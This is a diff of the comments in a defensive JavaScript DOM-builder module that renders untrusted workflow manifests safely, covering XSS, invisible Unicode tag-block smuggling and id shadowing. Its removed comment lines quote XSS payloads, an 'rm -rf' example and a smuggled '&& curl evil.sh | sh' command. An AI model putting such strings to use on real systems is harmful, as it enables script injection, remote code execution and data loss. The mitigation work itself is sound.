@@ -5,31 +5,31 @@
 //
 // The install sheet, the publish sheet, the consent gate and the card
 // receipts strip all render strings that arrived inside a
-// workflow.husk.json written by a stranger. This window runs with
+// workflow.husk.json this machine did not write. This window runs with
 // sandbox:false and its preload exposes workflows.create and
 // workflows.run, so one interpolated string reaching innerHTML is not a
-// defacement, it is code execution that can write a workflow with a
-// pinned agentCommand and start it. The house pattern everywhere else in
-// app.js is a template literal assigned to .innerHTML; these surfaces do
-// not get to use it, and this file is what they use instead.
+// cosmetic defect, it is script execution, and what that reaches covers
+// writing a workflow with a pinned agentCommand and starting it. The
+// house pattern everywhere else
+// in app.js is a template literal assigned to .innerHTML; these surfaces
+// do not get to use it, and this file is what they use instead.
 //
 // el() is the whole mitigation, and it is deliberately boring: every
 // element comes from createElement, every attribute goes through
 // setAttribute against an allowlist, and every value that is not already
-// a node becomes a text node. Nothing in this file parses markup, so
-// there is nothing here for a payload to be parsed by. A string like
-// '<img onerror=alert(1)>' is 21 characters of content and stays that
-// way no matter which slot it lands in.
+// a node becomes a text node. Nothing in this file parses markup, so a
+// string shaped like a tag has nothing here to be parsed by: it is
+// content, and it stays content no matter which slot it lands in.
 //
 // Three deliberate omissions, each of which someone will eventually ask
 // for:
 //
-//   - No href, src or style attribute. Each is a sink a string can
-//     subvert (javascript: URLs, url() fetches) and none of the four
-//     surfaces needs one: they are class-driven, and their only
-//     navigation is a button with a listener bound in code.
-//   - No innerHTML escape hatch, not even a commented one. The next
-//     person who needs it "just this once" is the vulnerability.
+//   - No href, src or style attribute. Each turns a string into a
+//     navigation or a fetch (javascript: URLs, url() fetches) and none
+//     of the four surfaces needs one: they are class-driven, and their
+//     only navigation is a button with a listener bound in code.
+//   - No innerHTML escape hatch, not even a commented one. An exception
+//     granted to one call site reopens the whole hole.
 //   - No event-handler attributes. A handler belongs on the element
 //     via addEventListener, in our source, where a reader can see what
 //     it closes over.
@@ -41,10 +41,10 @@
 //     text node and every string attribute value. The consent gate is
 //     the screen a user reads before agreeing to let a stranger's
 //     commands run against a bound directory, so a string that displays
-//     differently from the way it executes is the attack, not a
-//     cosmetic problem. The class of characters is defined by the
-//     Unicode tables rather than by a list somebody remembered to
-//     extend; see INVISIBLE_RE.
+//     differently from the way it executes is the failure this module
+//     exists to catch, not a cosmetic problem. The class of characters
+//     is defined by the Unicode tables rather than by a list somebody
+//     remembered to extend; see INVISIBLE_RE.
 //   - Every string attribute is capped and left well formed: the cut
 //     never splits a surrogate pair, the class attribute obeys the same
 //     ceiling as every other one rather than growing with the manifest,
@@ -57,10 +57,10 @@
 //     See ID_REF_RE for why.
 //
 // On throwing. The rest of src/lib returns { ok, error } and never
-// throws, because those modules validate hostile input and a validator
-// that throws has crashed the app. This module splits that line on
-// purpose, and the split is drawn at what a stranger's JSON can
-// actually produce:
+// throws, because those modules validate input this machine did not
+// write and a validator that throws has crashed the app. This module
+// splits that line on purpose, and the split is drawn at what a
+// stranger's JSON can actually produce:
 //
 //   - Structure is written as a literal by us, in our source: the tag
 //     name, an attribute name, and the *type* of an attribute value. A
@@ -71,11 +71,12 @@
 //     slot has a type, and the type came from us.
 //   - Content is the stranger's data: children, class tokens and the
 //     characters inside a string value. Content is turned into text,
-//     truncated, or dropped, and it is not thrown on, because a hostile
-//     file has to produce a rendered refusal rather than a blank pane.
-//     A child that is a plain object is dropped, a class token that is
-//     not a token is dropped, an id outside our namespace is dropped,
-//     and the surrounding tree still renders.
+//     truncated, or dropped, and it is not thrown on, because a file
+//     this machine did not write has to produce a rendered refusal
+//     rather than a blank pane. A child that is a plain object is
+//     dropped, a class token that is not a token is dropped, an id
+//     outside our namespace is dropped, and the surrounding tree still
+//     renders.
 //   - Two shapes stay loud even though they arrive in a content slot.
 //     A child that is a function, a symbol, a non-finite number or an
 //     array that contains itself is something JSON.parse cannot
@@ -86,8 +87,8 @@
 //     what is above it. A child that *claims* to be a node (it carries
 //     a nodeType, its own symbol keys, or its own toString) and cannot
 //     be verified as one is refused rather than dropped, because
-//     dropping it would erase the only evidence that something tried to
-//     smuggle a node into the tree.
+//     dropping it would erase the only evidence that a value arrived
+//     carrying a node's markings without being one.
 //
 // Everything that leaves this module carries a code. setAttribute
 // cannot fail here, because every name it is handed has already passed
@@ -146,8 +147,8 @@ const BOOLEAN_ATTRS = new Set([
 ]);
 
 // `type` changes what an element *is*, so it is pinned per tag rather
-// than accepted as free text. input type="image" and type="file" both
-// grow attack surface (formaction, a file picker) that no surface here
+// than accepted as free text. input type="image" and type="file" each
+// bring behaviour (formaction, a file picker) that no surface here
 // wants.
 const INPUT_TYPES = new Set(['checkbox', 'radio', 'text', 'search', 'number', 'hidden']);
 const BUTTON_TYPES = new Set(['button', 'submit', 'reset']);
@@ -163,9 +164,10 @@ const ARIA_SUFFIX_RE = /^[a-z]+$/;
 // is an error rather than something to guess about.
 const DATASET_KEY_RE = /^[a-z][A-Za-z0-9]*$/;
 // A class token is inert once it goes through setAttribute, so this is
-// not a security boundary; it is the F6 guard. A receipt-derived status
-// of 'x" onload=alert(1)' has to become nothing at all, not a token
-// somebody later interpolates into a selector or a template.
+// not a security boundary; it is the token-shape guard. A
+// receipt-derived status carrying a quote and a space has to become
+// nothing at all, not a token somebody later interpolates into a
+// selector or a template.
 const CLASS_TOKEN_RE = /^[A-Za-z0-9_-]+$/;
 
 // The selector argument above is really an argument about id, and about
@@ -173,7 +175,8 @@ const CLASS_TOKEN_RE = /^[A-Za-z0-9_-]+$/;
 // times and interpolates an id straight into a selector
 // (`#wf-canvas [id="node-${wfSelectedNodeId}"]`, app.js:3765), and the
 // consent gate itself is found by id, so a manifest-derived id can both
-// break out of a selector and shadow a real element in document order.
+// change what that selector matches and shadow a real element in
+// document order.
 // This builder therefore owns exactly one namespace and writes nothing
 // outside it: an id it did not shape is dropped, the same way a class
 // token that is not a token is dropped. Nothing static in index.html
@@ -206,8 +209,10 @@ const SHELL_REF_IDS = new Set([
 // space-separated list of them. These are the ARIA half of the same
 // invariant `id`, `for` and `headers` carry: they name an element, and a
 // name that came out of a manifest names whatever the manifest chose,
-// including the shell's own controls. Before this list they went through
-// resolveValue alone and took any four thousand characters at all.
+// including the shell's own controls. resolveValue alone does not settle
+// that: it caps a value at four thousand characters and has no opinion
+// about which element those characters point at, so these two lists are
+// what hold the reference to the namespace.
 const SINGLE_REF_ATTRS = new Set([
   'for', 'aria-activedescendant', 'aria-details', 'aria-errormessage',
 ]);
@@ -249,18 +254,18 @@ class WfxDomError extends Error {
 // The class is written as Unicode properties rather than as a list of
 // ranges, and the reason is the tag block. U+E0000 to U+E007F is a
 // complete, entirely invisible copy of ASCII, one well formed surrogate
-// pair per character, which makes it the smuggling channel rather than
-// a curiosity: the import validator refuses a manifest carrying an
+// pair per character, which makes it the channel that matters rather
+// than a curiosity: the import validator refuses a manifest carrying an
 // unpaired surrogate and nothing else about unicode, so a hidden second
-// command arrives here well formed and, until this changed, left here
-// well formed too. A hand-written range list had missed it, and had
-// also missed U+206A-206F sitting between two ranges it did name, the
+// command reaches this module well formed and is scrubbed here or
+// nowhere. A hand-written range list misses it, and misses
+// U+206A-206F sitting between two ranges such a list does name, the
 // variation selectors, the interlinear annotation marks, and the Hangul
 // fillers, which render as blanks without being format characters at
 // all. Any list maintained by hand is a list of the invisibles somebody
 // has heard of, so the tables decide instead: \p{Cf} is every format
-// character, including the tag block and any assigned after this was
-// written; \p{Default_Ignorable_Code_Point} adds the ones that are not
+// character, including the tag block and any the tables assign later;
+// \p{Default_Ignorable_Code_Point} adds the ones that are not
 // format characters; and \p{Zl} with \p{Zp} adds U+2028 and U+2029,
 // which are not invisible but are line breaks, and a line break inside
 // the <pre> the prompt list uses can push the real command out of the
@@ -277,17 +282,17 @@ const UNPAIRED_SURROGATE_RE = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\u
 // U+FFFD is what a decoder writes when a character could not be
 // represented, which is exactly the fact being reported, and it is one
 // code unit wide so a capped value stays capped. Deleting the character
-// would be the more dangerous choice: it would let
-// 'rm -rf /<zero width space>tmp' render as the command it is
-// pretending not to be, which is the reordering problem again with the
+// is the more dangerous choice: it would let a destructive command with
+// a zero-width space inside a path render as the harmless one it is
+// pretending to be, which is the reordering problem again with the
 // evidence removed.
 //
 // The tag block makes that argument sharper rather than weaker, which
 // is worth stating because the instinct on reading about hidden text is
 // to strip it. 'git status' followed by twenty-one tag characters
-// spelling ' && curl evil.sh | sh' renders, if the tag characters are
-// deleted, as the two words 'git status': exactly the string the author
-// of that payload wanted the consent gate to show, and the user then
+// spelling a second chained command renders, if the tag characters are
+// deleted, as the two words 'git status': exactly the string the file's
+// author wants the consent gate to show, and the user then
 // approves a command whose other half is still in the file the runner
 // reads. Replaced, the same prompt renders as 'git status' followed by
 // twenty-one replacement glyphs, which is unmistakably not a command
@@ -338,14 +343,14 @@ function safeOwnKeys(value) {
 }
 
 // Renders any value for an error message without becoming a second bug.
-// A template literal throws on a symbol and runs an attacker-supplied
-// toString, and Object.prototype.toString is no better because it reads
-// Symbol.toStringTag, which can be a throwing getter. Since describe()
-// runs inside the construction of every WfxDomError, a throw here would
-// replace a coded refusal with a bare Error carrying an
-// attacker-written message, so nothing below reads a property of the
-// value at all: typeof and safeIsArray are the whole vocabulary. The
-// try stays even though safeIsArray owns the proxy hazard now, because
+// A template literal throws on a symbol and runs a toString the value's
+// own author wrote, and Object.prototype.toString is no better because
+// it reads Symbol.toStringTag, which can be a throwing getter. Since
+// describe() runs inside the construction of every WfxDomError, a throw
+// here would replace a coded refusal with a bare Error carrying a
+// message written outside this file, so nothing below reads a property
+// of the value at all: typeof and safeIsArray are the whole vocabulary.
+// The try is here even though safeIsArray owns the proxy case, because
 // this function runs while an error is being reported and an error
 // raised there is the one failure with nothing left to catch it.
 function describe(value) {
@@ -438,7 +443,7 @@ function resolveValue(name, value) {
 // An id this builder is willing to write into a reference: one it
 // minted itself, or one of the handful the shell owns. `id` itself is
 // deliberately not run through here, because minting a shell id is the
-// shadowing attack rather than a reference to it.
+// shadowing itself rather than a reference to it.
 function isReferableId(token) {
   return ID_REF_RE.test(token) || SHELL_REF_IDS.has(token);
 }
@@ -650,8 +655,8 @@ function isRealNode(doc, value) {
   if (!Ctor) return false;
   try {
     // instanceof walks the value's prototype chain and consults
-    // Symbol.hasInstance on the constructor, never on the value, so a
-    // hostile object gets no say in the answer. It does read the chain
+    // Symbol.hasInstance on the constructor, never on the value, so the
+    // value itself gets no say in the answer. It does read the chain
     // through GetPrototypeOf, though, which is the one thing a revoked
     // proxy will not do, and a value that cannot be asked whether it is
     // a node is not one.
@@ -707,14 +712,16 @@ function textNode(doc, data) {
 }
 
 // `open` holds the arrays on the path from the top of this walk down to
-// here, which is what separates the two shapes the old depth-only test
-// confused. See the comment on the array branch below.
+// here, which is what separates a cycle from a merely deep list; a
+// depth counter alone cannot tell them apart. See the comment on the
+// array branch below.
 function appendAll(doc, parent, children, depth, open) {
   // Past the cap the walk stops and the surrounding tree renders,
   // exactly as collectClass stops a nested class list. Twenty nested
   // arrays are one line of JSON, so a manifest can produce this shape
-  // for free, and content is dropped rather than thrown on: a hostile
-  // file has to produce a rendered refusal, not a blank pane.
+  // for free, and content is dropped rather than thrown on: a file this
+  // machine did not write has to produce a rendered refusal, not a
+  // blank pane.
   if (depth > MAX_CHILD_DEPTH) return;
   for (const child of children) {
     // false and null are how a caller writes a conditional child, so
@@ -738,8 +745,8 @@ function appendAll(doc, parent, children, depth, open) {
     const arrayness = safeIsArray(child);
     if (arrayness === null) {
       // Nothing JSON.parse produces refuses to say whether it is an
-      // array; a revoked proxy does, and it is the shape that used to
-      // put a bare TypeError from IsArray on the way out of here.
+      // array; a revoked proxy does, and unhandled it is the shape that
+      // puts a bare TypeError from IsArray on the way out of here.
       throw new WfxDomError('bad-child',
         'el(): a child refused to say what it is, which no value out of a manifest does');
     }
